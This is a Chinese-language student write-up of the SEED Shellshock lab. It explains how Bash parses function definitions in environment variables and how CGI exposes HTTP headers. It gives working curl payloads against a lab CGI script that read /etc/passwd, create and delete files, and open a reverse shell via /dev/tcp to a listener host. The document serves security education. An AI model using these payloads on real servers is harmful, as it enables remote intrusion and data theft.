---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# Shellshock

## 任务 1：Bash 函数实验

首先我们创建一个环境变量，构造一个形如 bash 函数定义的字符串，并注入一个恶意命令：

![](../../../../../assets/Pasted%20image%2020250705160123.png)

在父进程中，这个环境变量只是一个字符串，并没有被当做是函数定义来处理

如果我们启动含有 shellshock 漏洞的 Bash：

![](../../../../../assets/Pasted%20image%2020250705160454.png)

可以看到，Bash 执行了我们输入的命令，并且定义了函数 foo，如果我们启动一个没有 shellshock 漏洞的 Bash：

![](../../../../../assets/Pasted%20image%2020250705160536.png)

可以看到，Bash 没有执行我们输入的命令，并且没有定义函数 foo
***
## 任务 2：通过环境变量传递数据给 Bash

### 任务 2.A：使用浏览器

在浏览器中打开 URL `http://www.seed-server.com/cgi-bin/getenv.cgi`，浏览器会显示一个长列表，这些都是由 Apache Web 服务器为 `getenv.cgi` 脚本设置的环境变量

![](../../../../../assets/Pasted%20image%2020250705162617.png)

可以看到，请求头和环境变量有很多重合，比如：

- `HTTP_HOST` 对应 `Host`
- `HTTP_USER_AGENT` 对应 `User-Agent`
- `HTTP_ACCEPT` 对应 `Accept`
- `HTTP_ACCEPT_LANGUAGE` 对应 `Accept-Language`
- `HTTP_ACCEPT_ENCODING` 对应 `Accept-Encoding`
- `HTTP_CONNECTION` 对应 `Connection`
- `HTTP_UPGRADE_INSECURE_REQUESTS` 对应 `Upgrade-Insecure-Requests`
- `HTTP_CACHE_CONTROL` 对应 `Cache-Control`
***
### 任务 2.B：使用 curl

首先我们利用 `-v` 选项来打印 HTTP 请求头：

![](../../../../../assets/Pasted%20image%2020250705163102.png)

通过 `-A` 选项来设置 User-Agent：

![](../../../../../assets/Pasted%20image%2020250705163538.png)

可以看到，我们修改了 User-Agent 的值，并且在 CGI 的环境变量中也成功设置了

通过 `-e` 选项来设置 Referer：

![](../../../../../assets/Pasted%20image%2020250705163501.png)

同样可以看到，我们修改了 Referer 的值，并且在 CGI 的环境变量中也成功设置了

通过 `-H` 选项来设置任意的 HTTP 请求头：

![](../../../../../assets/Pasted%20image%2020250705163644.png)

综上所述，通过 `-A`、 `-e` 和 `-H` 选项，我们都可以设置 HTTP 请求头，并且这些请求头会被传递给 CGI 程序作为环境变量
***
## 任务 3：发起 Shellshock 攻击

### 任务 3.A

用 `-A` 选项，利用命令 `curl -A "() { echo hello; }; echo Content-type: text/plain; echo; /bin/cat /etc/passwd" http://www.seed-server.com/cgi-bin/vul.cgi` 来读取 `/etc/passwd` 文件：

![](../../../../../assets/Pasted%20image%2020250705165255.png)
***
### 任务 3.B

用 `-e` 选项，利用命令 `curl -e "() { echo hello; }; echo Content-type: text/plain; echo; /bin/id" http://www.seed-server.com/cgi-bin/vul.cgi` 来打印出 ID 信息：

![](../../../../../assets/Pasted%20image%2020250705165138.png)

可以看到输出的为用户 `www-data` 的 ID 信息
***
### 任务 3.C

用 `-H` 选项，利用命令 `curl -H "User-Agent: () { echo hello; }; echo Content-type: text/plain; echo; /bin/touch /tmp/hacked" http://www.seed-server.com/cgi-bin/vul.cgi` 来创建一个 `/tmp/hacked` 文件，并通过 `curl -H "User-Agent: () { echo hello; }; echo Content-type: text/plain; echo; /bin/ls -l /tmp" http://www.seed-server.com/cgi-bin/vul.cgi` 来验证：

![](../../../../../assets/Pasted%20image%2020250705164512.png)

可以看到，我们成功创建了一个 `/tmp/hacked` 文件，且拥有者为 `www-data` 用户
***
### 任务 3.D

利用命令 `curl -H "User-Agent: () { echo hello; }; echo Content-type: text/plain; echo; /bin/rm /tmp/hacked" http://www.seed-server.com/cgi-bin/vul.cgi` 来删除 `/tmp/hacked` 文件，并通过 `curl -H "User-Agent: () { echo hello; }; echo Content-type: text/plain; echo; /bin/ls -l /tmp" http://www.seed-server.com/cgi-bin/vul.cgi` 来验证：

![](../../../../../assets/Pasted%20image%2020250705164748.png)

可以看到，我们成功删除了 `/tmp/hacked` 文件
***
### 问题解答

- **问题 1：你能否从服务器窃取  `/etc/shadow`  文件的内容？为什么或者为什么不行？**
	- 不能。从任务 3.B 我们得知，CGI 脚本是以用户 `www-data` 的身份运行的，`/etc/shadow` 文件存储着加密后的用户密码，为了安全，它的权限设置通常为 `root` 用户可读写，其他用户（包括 `www-data`）没有任何权限。因此，即使我们能执行命令，也无法读取一个没有权限访问的文件
	- 我们可以通过 `curl -H "User-Agent: () { echo hello; }; echo Content-type: text/plain; echo; /bin/cat /etc/shadow" http://www.seed-server.com/cgi-bin/vul.cgi` 来尝试读取 `/etc/shadow` 文件，不会有任何输出：
	
	![](../../../../../assets/Pasted%20image%2020250705165704.png)
	
- **问题 2：我们能否使用 `QUERY_STRING` 这种方法发起 Shellshock 攻击？**
	- 不能。我们可以尝试使用 `curl http://www.seed-server.com/cgi-bin/getenv.cgi?"(){ echo hello; }; echo Content-type: text/plain; echo; /bin/cat /etc/passwd"` 来发起攻击，但是 curl 本身不支持这样的格式：
	
	![](../../../../../assets/Pasted%20image%2020250705165916.png)
***
## 任务 4：通过 Shellshock 攻击获取反向 Shell

在我们的主机上运行监听端口程序：

![](../../../../../assets/Pasted%20image%2020250705170150.png)

同时在另一个进程中，用 `curl -H "User-Agent: () { echo hello; }; /bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1" http://www.seed-server.com/cgi-bin/vul.cgi` 命令发起攻击：

![](../../../../../assets/Pasted%20image%2020250705170509.png)

可以看到，我们成功获取了反向 Shell，并且可以通过这个 Shell 执行任意命令
***
## 任务 5：使用已修补的 Bash

在容器内部修改 `vul.cgi` 文件：

![](../../../../../assets/Pasted%20image%2020250705182055.png)

然后重新进行任务 3 的攻击：

![](../../../../../assets/Pasted%20image%2020250705182238.png)

可以看到，所有的攻击都失败了，全部都输出了 `vul.cgi` 自带的 `Hello World`